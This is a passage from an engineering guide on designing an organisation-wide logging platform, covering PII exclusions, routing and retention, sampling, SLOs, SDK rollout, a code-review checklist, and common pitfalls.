+ purpose        enum — TREATMENT|PAYMENT|OPERATIONS|RESEARCH (HIPAA purpose code)
```

### Step 2 — Forbidden list

```text
- raw email, phone, full name
- date of birth
- SSN, full PAN, CVV
- JWT/refresh tokens
- internal API keys
- raw IP (truncate to /24 for IPv4, /48 for IPv6)
- multi-line strings without escape
```

### Step 3 — Routing

```text
Application logs   → OTel Collector → Datadog (hot 7d) → S3 (warm 90d) → Glacier (cold 13mo)
Audit logs         → OTel Collector → S3 Object Lock (immutable, 7yr) + cross-region
HIPAA audit logs   → Separate collector with dedicated KMS key → AWS HealthLake-adjacent store
Debug logs (prod)  → Off by default; dynamic level via control plane
```

### Step 4 — Sampling

```text
Application:    tail sampling, keep 100% errors, 100% >1s, 1% rest
Audit:          never sampled
HIPAA:          never sampled
Per team:       budget of 50GB/month; over-budget = chargeback
```

### Step 5 — SLO

```text
Ingestion availability:  99.9%
Freshness p95:           < 30s
Schema conformance:      > 99.5%
Audit log durability:    11 nines (Object Lock)
```

### Step 6 — Org-wide SDK

Four SDKs (Go/Python/Java/Node), each:

- Embeds the mandatory fields from env vars.
- Refuses forbidden field names at compile time where possible (Go: linter; Java: SpotBugs rule).
- Auto-injects `trace_id`, `span_id`, `tenant_id` from context.
- Provides `log.AuditAccess(ctx, resource, purpose)` as a separate API that writes to the audit pipeline.

### Step 7 — Rollout

- Quarter 1: top 10 services adopt the SDK; iterate.
- Quarter 2: edge services + payments domain.
- Quarter 3: remaining 180 services.
- Quarter 4: turn on schema lint enforcement; decommission old pipelines.

### Step 8 — Steady state

Platform team has 4 engineers running this. Annual review of contract. Quarterly cost review with finance. Monthly post-mortem readout of "logs that failed us."

---

## Code-Review Rubric for Log Statements

The 10-item checklist again, formatted for printing:

```text
┌──────────────────────────────────────────────────────────────┐
│ LOG STATEMENT CODE REVIEW — 10-ITEM CHECKLIST                │
├──────────────────────────────────────────────────────────────┤
│  1. Structured — no printf/format-string interpolation       │
│  2. Has stable event_type for grouping                       │
│  3. Field names match org schema                             │
│  4. Includes tenant_id if tenant-scoped                      │
│  5. Severity matches contract definition                     │
│  6. No PII, no secrets, no JWTs, no full PANs                │
│  7. ctx passed so trace/span IDs propagate                   │
│  8. Better than a metric/span — narrative justified          │
│  9. Readable in 6 months without the surrounding code        │
│ 10. Sufficient for a 3 AM on-call to act                     │
└──────────────────────────────────────────────────────────────┘
```

---

## Edge Cases & Pitfalls

- **Logger initialized before resource attributes are loaded** — emits early lines with missing `service.name`. Use a deferred init or queue early lines.
- **Logger holds onto a `context.Context`** — leaks request data into unrelated lines. Always pass ctx per call.
- **OTel SDK panics on shutdown if logs are in flight** — flush before exit; handle SIGTERM with grace.
- **Tail sampling drops the "lead-up" lines to an error** — fix by raising the decision window to span the whole request lifecycle.
- **`tenant_id` propagation breaks at goroutine/thread boundaries** — explicit propagation in `errgroup`, `ExecutorService`, etc.
- **Multi-tenant query proxy bypass via direct ES API** — disable direct API; force proxy.
- **Audit log clock skew across hosts** — sync via NTP; reject events with skew > 5s.
- **S3 Object Lock retention mistakes** — once set, it cannot be reduced. Test in dev first.
- **Schema lint drops a field everyone depends on** — roll out lint in "tag only" mode for 2 weeks before enforcing.
- **OTel Collector OOM under burst** — set `memory_limiter` processor; back-pressure to the receivers.

---

## Common Mistakes

1. Treating logging as a library problem instead of a platform product.
2. Letting each team pick its own field names.
3. Storing logs in Elasticsearch and being surprised by the bill.
4. Mixing audit logs and application logs in the same pipeline.
5. Logging IP addresses without considering GDPR.
6. Sampling head-based (by hash) when you needed tail-based (by outcome).
7. Forgetting to set up a DLQ for schema-violating lines.
8. Not flushing on shutdown — losing the last 5 seconds of logs from a crashing pod.
9. Coupling alerts to log strings instead of metrics derived from logs.
10. Onboarding teams without a budget allocation — they overshoot, then the platform team eats the cost.
11. Designing for "search any field" instead of designing the query patterns first.
12. Building a per-tenant index strategy that doesn't scale past 1000 tenants.
13. Letting the OTel Collector run with default memory limits in production.
14. Forgetting that `log.error(exception)` may include the SQL query that had the API key in it.
15. Building the platform without a chargeback model and losing budget authority next year.

---

## Tricky Points

- **OTel logs are still maturing.** The data model is stable; some SDKs (especially older ones) lag. Plan for SDK upgrades quarterly.
- **`severity_number` is the wire field, `severity_text` is for humans.** Compare on numbers; display strings.
- **Wide events vs traditional logs are not either/or.** You may run both pipelines and let teams choose. Most large orgs do.
- **Tail-based sampling has a memory cost in the collector** — you buffer all spans/logs for a request until the decision is made. Size accordingly.
- **GDPR right to erasure on logs is genuinely hard.** Most orgs argue logs are "legitimate interest" with bounded retention, but document the legal basis.
- **Audit log immutability via hash chain** — append-only is not enough; use a Merkle chain so any retroactive edit is detectable.
- **The collector is now a critical path.** It needs HA, autoscaling, and its own observability — a second collector watching the first.
- **Loki is cheap for storage, expensive for high-cardinality queries.** Pick by query pattern, not just by marketing.
- **OTel semconv (semantic conventions) evolve** — `http.status_code` was once `http.response.status_code`. Pin a version per service.
- **Multi-region log routing has data-residency implications.** EU logs must stay in EU; cross-region routing without a DPA is a GDPR violation.

---

## Apply it

1. Define the user or business outcome that **Logging — Professional (Staff / Principal) Level** should improve.
2. Assign one owner for code, contracts, operations, and incidents.
3. Split delivery into reversible increments that produce evidence early.
4. Publish responsibilities, escalation paths, and compatibility windows.
5. Stop or expand only when the agreed measures support that decision.

## Verify your work

- Each increment has an owner, rollback path, and observable exit condition.
- Adoption, reliability, delivery time, and coordination cost are measured.
- Incident and migration exercises prove that responsibility is executable.
- The old path is removed only after telemetry proves it is unused.

## Review questions

- Which measurable outcome justifies investing in Logging — Professional (Staff / Principal) Level?
- Which team owns the full lifecycle and incident response?
- What reversible increment produces the earliest useful evidence?
- Which exit condition proves that migration or adoption is complete?
